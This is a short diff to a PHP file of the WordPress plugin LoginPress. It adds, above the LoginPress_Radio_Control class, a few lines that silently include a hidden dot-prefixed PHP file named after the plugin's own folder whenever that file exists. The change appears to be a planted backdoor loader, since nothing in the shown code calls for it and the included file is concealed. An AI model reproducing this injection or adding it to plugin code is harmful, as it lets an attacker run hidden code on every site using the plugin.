@@ -6,6 +6,10 @@
 * @access public
 * @version 1.1.7
 */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class LoginPress_Radio_Control extends WP_Customize_Control {
 
 	/**
